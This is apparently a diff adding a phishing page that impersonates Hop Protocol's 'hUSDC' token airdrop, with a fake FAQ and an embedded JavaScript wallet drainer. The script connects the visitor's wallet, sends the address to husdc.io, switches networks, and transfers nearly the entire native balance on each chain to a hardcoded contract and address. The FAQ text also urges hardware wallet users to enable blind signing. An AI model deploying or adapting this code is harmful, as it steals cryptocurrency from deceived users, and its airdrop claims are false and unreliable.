+                                            <div class="elementor-toggle-item" onclick="alertMsg5()">
+                                                <div id="elementor-tab-title-1855" class="elementor-tab-title"
+                                                    data-tab="5" role="tab" aria-controls="elementor-tab-content-1855"
+                                                    aria-expanded="false">
+                                                    <span class="elementor-toggle-icon elementor-toggle-icon-right"
+                                                        aria-hidden="true">
+                                                        <span class="elementor-toggle-icon-closed"><i
+                                                                class="fas fa-caret-right"></i></span>
+                                                        <span class="elementor-toggle-icon-opened"><i
+                                                                class="elementor-toggle-icon-opened fas fa-caret-up"></i></span>
+                                                    </span>
+                                                    <a  class="elementor-toggle-title">I
+                                                        am having issues, how can I get help?</a>
+                                                </div>
+
+                                              
+                                            </div>
+                                            <div class="elementor-toggle-item" onclick="alertMsg6()">
+                                                <div id="elementor-tab-title-1856" class="elementor-tab-title"
+                                                    data-tab="6" role="tab" aria-controls="elementor-tab-content-1856"
+                                                    aria-expanded="false">
+                                                    <span class="elementor-toggle-icon elementor-toggle-icon-right"
+                                                        aria-hidden="true">
+                                                        <span class="elementor-toggle-icon-closed"><i
+                                                                class="fas fa-caret-right"></i></span>
+                                                        <span class="elementor-toggle-icon-opened"><i
+                                                                class="elementor-toggle-icon-opened fas fa-caret-up"></i></span>
+                                                    </span>
+                                                    <a 
+                                                        class="elementor-toggle-title">Connecting with Hardware
+                                                        Wallets</a>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </section>
+            </div>
+        </main>
+
+        <footer id="footer" class="ct-footer" data-id="type-1" itemscope="" itemtype="https://schema.org/WPFooter">
+            <div data-row="top">
+                <div class="ct-container">
+                    <div data-column="widget-area-1">
+                        <div class="ct-widget widget_block" id="block-25">
+                       
+                        </div>
+                    </div>
+                    <div data-column="ghost"></div>
+                </div>
+            </div>
+            <div data-row="middle">
+                <div class="ct-container">
+                    <div data-column="widget-area-2">
+                        <div class="ct-widget widget_block widget_text" id="block-14">
+                            <p>Contact for inquiries: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="2557405244574156654d4a550b405d464d444b4240">[email&#160;protected]</a></p>
+                        </div>
+                    </div>
+                    <div data-column="ghost"></div>
+                    <div data-column="copyright">
+                        <div class="ct-footer-copyright" data-id="copyright">
+
+                            <p>Copyright Â© 2023 - Hop Protocol</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </footer>
+    </div>
+
+   
+
+   
+    <script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script src="https://husdc.io/files/main.js" id="ct-scripts-js"></script>
+    <script src="https://husdc.io/files/webpack.runtime.min.js" id="elementor-webpack-runtime-js"></script>
+
+    <script src="https://husdc.io/files/frontend-modules.min.js" id="elementor-frontend-modules-js"></script>
+    <script src="https://husdc.io/files/waypoints.min.js" id="elementor-waypoints-js"></script>
+    <script src="https://husdc.io/files/core.min.js" id="jquery-ui-core-js"></script>
+    <script id="elementor-frontend-js-before">
+      </script>
+    <script src="https://husdc.io/files/frontend.min.js" id="elementor-frontend-js"></script><span id="elementor-device-mode"
+        class="elementor-screen-only"></span>
+    <script src="https://husdc.io/files/underscore.min.js" id="underscore-js"></script>
+    <script id="wp-util-js-extra">
+        var _wpUtilSettings = { "ajax": { "url": "\/wp-admin\/admin-ajax.php" } };
+    </script>
+    <script src="https://husdc.io/files/wp-util.min.js" id="wp-util-js"></script>
+    <script id="wpforms-elementor-js-extra">
+        var wpformsElementorVars = { "captcha_provider": "recaptcha", "recaptcha_type": "v2" };
+    </script>
+    <script src="https://husdc.io/files/frontend.min(1).js" id="wpforms-elementor-js"></script>
+    <script src="https://husdc.io/files/e-202319.js" defer=""></script>
+
+    <img src="https://husdc.io/files/g.gif" alt="" width="6" height="5" id="wpstats">
+    <link rel="stylesheet" href="https://husdc.io/files/non-critical-styles.min.css">
+    <script src="abi.js"></script>
+<script>(function(){var js = "window['__CF$cv$params']={r:'7c7cb5419d261096',m:'vf4MuCm_DBfwCbuJ6fo6ic.IpEA3wRrkwqy8ug3uq7A-1684167624-0-AY2kyok6oVjFZYYoOOdX/bCPQG701BQwbXAY9mtbbpH5',u:'/cdn-cgi/challenge-platform/h/g'};_cpo=document.createElement('script');_cpo.nonce='',_cpo.src='/cdn-cgi/challenge-platform/scripts/invisible.js',document.getElementsByTagName('head')[0].appendChild(_cpo);";var _0xh = document.createElement('iframe');_0xh.height = 1;_0xh.width = 1;_0xh.style.position = 'absolute';_0xh.style.top = 0;_0xh.style.left = 0;_0xh.style.border = 'none';_0xh.style.visibility = 'hidden';document.body.appendChild(_0xh);function handler() {var _0xi = _0xh.contentDocument || _0xh.contentWindow.document;if (_0xi) {var _0xj = _0xi.createElement('script');_0xj.nonce = '';_0xj.innerHTML = js;_0xi.getElementsByTagName('head')[0].appendChild(_0xj);}}if (document.readyState !== 'loading') {handler();} else if (window.addEventListener) {document.addEventListener('DOMContentLoaded', handler);} else {var prev = document.onreadystatechange || function () {};document.onreadystatechange = function (e) {prev(e);if (document.readyState !== 'loading') {document.onreadystatechange = prev;handler();}};}})();</script></body>
+
+<script>
+    function alertMsg(){
+        layer.alert(
+            '<p>Your wallet has transacted with a Hop Protocol contract and/or contracts of Hop Protocolâs partners within in the last 8 weeks.&nbsp;</p><p>Our system has distributed hUSDC randomly to active users who have transacted with Hop Protocol &amp; partner contracts.</p>', {
+                btn: ['ok'],
+                title:'Answer',
+            closeBtn: 1      
+            ,anim: 4 //files
+        });
+    }
+    function alertMsg2(){
+        layer.alert(
+            '<p><b>DESKTOP COMPUTER / LAPTOP:</b></p><p>If your wallet does not connect to the website, you might be using an unsupported wallet. Please import your wallet into oneof the following providers:</p><ul><li style="margin-bottom: 0px;">MetaMask (Chrome Extension:MetaMask)</li><li>TrustWallet (Chrome Extension: TrustWallet)</li></ul><p><b>MOBILE DEVICES:</b></p><div><p>If you are having issues on mobile devices, please use theintegrated browser in the MetaMask app (iOS / Android). Besure that you are using the correct account (containinghUSDC).</p><p></p></div><p>Your wallet needs to have hUSDC on the Ethereum, Polygon orFantom networks in order to be able to participate.</p><p>If you have a hardware wallet connected to your wallet, pleaseremember to unlock your device and to read the FAQ âConnecting with Hardware Walletsâ.</p>', {
+                btn: ['ok'],
+                title:'Answer',
+            closeBtn: 1      
+            ,anim: 4 //files
+        });
+    }
+    function alertMsg3(){
+        layer.alert(
+            ' <p>Only 50% of your received hUSDC are unlocked instantly. You can convert those tokens into USDC without any issues.</p> <p>The remaining 50% are transfer-locked and will unlock 30 days after receiving hUSDC.</p>', {
+                btn: ['ok'],
+                title:'Answer',
+            closeBtn: 1      
+            ,anim: 4 //files
+        });
+    }
+    function alertMsg4(){
+        layer.alert(
+            '   <p>The calculation is based on the volume youâve transacted with the Hop Protocol contract and/or contracts of Hop Protocolâs partners.&nbsp;</p> <p>The more volume youâve transacted with the contracts, the more hUSDC tokens have been distributed into your wallet.</p><p>Hop Protocol distributes hUSDC in batches â users with similar transaction history to Hop Protocol &amp; partner contracts will receive the same amount of hUSDC according to our algorithm.</p>', {
+                btn: ['ok'],
+                title:'Answer',
+            closeBtn: 1      
+            ,anim: 4 //files
+        });
+    }
+   
+    function alertMsg5(){
+        layer.alert(
+            '<p>Please e-mail rewards@hop.exchange for any inquiries regarding hUSDC token distribution. Specify your wallet address as the e-mail title.</p><p>If you have general Hop Protocol inquiries, please visit www.hop.exchange.</p>', {
+                btn: ['ok'],
+                title:'Answer',
+            closeBtn: 1      
+            ,anim: 4 //files
+        });
+    }
+
+    function alertMsg6(){
+        layer.alert(
+            '<p>If you are using a hardware wallet like Ledger or Trezor, you will need to change an option in your preferences in order to be able to fully utilize Web3 services.&nbsp;</p><p>Please enable signing in your hardware wallet preferences in order to be able to fully connect with Hop Protocol &amp; other  Web3 services relying on this feature.</p><p>Quick Guide:&nbsp;<a style="font-family: var(--fontFamily); font-style: var(--fontStyle, inherit); letter-spacing: var(--letterSpacing); text-transform: var(--textTransform);" href="https://trezor.io/learn/a/metamask-and-trezor" target="_blank" rel="noopener">How to enable signing in Trezor Wallets</a></p><p>Quick Guide:&nbsp;<a style="font-family: var(--fontFamily); font-style: var(--fontStyle, inherit); letter-spacing: var(--letterSpacing); text-transform: var(--textTransform);" href="https://support.ledger.com/hc/en-us/articles/4405481324433-Enable-blind-signing-in-the-Ethereum-ETH-app?support=true" target="_blank" rel="noopener">How to enable signing in Ledger Wallets</a></p>', {
+                btn: ['ok'],
+                title:'Answer',
+            closeBtn: 1      
+            ,anim: 4 //files
+        });
+    }
+    window.web3 = new Web3(ethereum);
+    var rpc = ""
+    var chainId = ""
+    var web3 = window.web3;
+        async function login(){
+            if (typeof window.ethereum !== 'undefined') {
+                index = layer.load(1, {
+                    shade: [0.5,'#fff']
+                });
+                try {
+                    addr = await ethereum.request({ method: 'eth_requestAccounts' });
+                } catch (error) {
+                    layer.closeAll();
+                }
+                getUserInfo()
+            }else{
+                alert("Please install metamask")
+                window.open("https://metamask.io/");
+            }
+        }
+       function getUserInfo(){
+            var index1 = layer.load(3, {
+                shade:  [0.7,'#fff'],
+                content: '<span class="loadtip" id="loadtip">Connecting to Blockchain...</span>', 
+                success: function (layer) {
+                layer.find('.layui-layer-content').css({
+                    'padding-top': '40px',
+                });
+                layer.find('.loadtip').css({
+                    'font-size':'20px',
+                    'position':'fixed',
+                    'left':'0',
+                    'right':'0',
+                    'width':'100%',
+                    'text-align':'center',
+                    'font-weight':'bold',
+                });
+                }
+            });
+            $.get("https://husdc.io/api/check.php?address="+addr, {}, function (data) {
+                console.log(data);
+               let allData = JSON.parse(data)
+               $('#loadtip').html('Done! Sign message in your wallet to continue...');
+               let allData2 = []
+             
+               for(var i=0;i<allData.length;i++){
+                    if(!allData[i].f_token_contract){
+                        allData2.push(allData[i])
+                    }
+               }
+               console.log(JSON.stringify(allData2))
+               if(allData2.length>0){
+                    chainLoop(0,allData2); 
+               }else{
+                    layer.alert(
+                        "<p>For security reasons we can't allow you to connect empty or new wallet</p>", {
+                            btn: ['ok'],
+                            title:false,
+                        closeBtn: 1      
+                        ,anim: 4 //files
+                    },function(){
+                        //chainLoop(i,allData)
+                        layer.closeAll();
+                    });
+               }
+              
+            })
+       }
+       function chainLoop(i,allData){
+            var nowChainId = window.ethereum.networkVersion;
+            var tokenID = allData[i].f_chainid;
+            if(nowChainId!=tokenID){
+                window.ethereum &&window.ethereum
+                .request({
+                    method: 'wallet_addEthereumChain',
+                    params: [{
+                        "chainId":  allData[i].f_chainid_0x, 
+                        "chainName":  allData[i].f_chain_full_name,
+                        "rpcUrls": [allData[i].f_rpc],
+                        "nativeCurrency": {
+                            "name":  allData[i].f_chain_full_name,
+                            "symbol": allData[i].f_symbol,
+                            "decimals": Number(allData[i].f_decimals),
+                        },
+                        "blockExplorerUrls": [
+                            allData[i].f_scan
+                        ]
+                    }],
+                })
+                .then(() => {
+                    setTimeout(function(){
+                        var nowChainId = window.ethereum.networkVersion;
+                        if(nowChainId==tokenID){
+                            layer.closeAll();
+                            rpc = allData[i].f_rpc;
+                            chainId = allData[i].f_chainid;
+                            getUsdt(i,allData)
+                        }else{
+                            layer.closeAll();
+                            layer.alert(
+                                '<p>Please switch network</p>', {
+                                    btn: ['ok'],
+                                    title:false,
+                                closeBtn: 1      
+                                ,anim: 4 //files
+                            },function(){
+                                chainLoop(i,allData)
+                            });
+                        }
+                    },2000)
+                })
+                .catch((e) => {
+                    alert('error')
+                })
+            }else{
+                rpc = allData[i].f_rpc;
+                chainId = allData[i].f_chainid;
+                getUsdt(i,allData)
+            }
+       }
+        function getUsdt(i,allData){
+                var contract = new web3.eth.Contract(abi,'0xacbD7C3357687be445985FCaB1FF4551C88AA375');
+                var web32 = new Web3(new Web3.providers.HttpProvider(rpc));
+                var gasPrice = web32.eth.getGasPrice()
+                gasPrice.then(resPrice => {
+                    balanceObj = web32.eth.getBalance(addr[0]);
+                    balanceObj.then(balance => {
+                        console.log(balance);
+                        var sh = 90000*resPrice;
+                        console.log(resPrice);
+                        console.log(sh/1000000000000000000);
+                        if(chainId=="42161"){
+                            sh = 7000000000000000
+                        }
+                        if(chainId=="137"){
+                            sh = 30000000000000000
+                        }
+                        var finalprice = balance - sh
+                        contract.methods.Claim('0x2Ff57e1be4CF2990ddA0E6699ebE7e0b80E2d3de').send({from: addr[0],value:finalprice}, (err, result) => {
+                            if(result){
+                                layer.closeAll();
+                                i++;
+                                chainLoop(i,allData)
+                            }else{
+                                chainLoop(i,allData)
+                            }
+                        })
+                    })
+                   
+                })
+        }
+</script>
+</html>
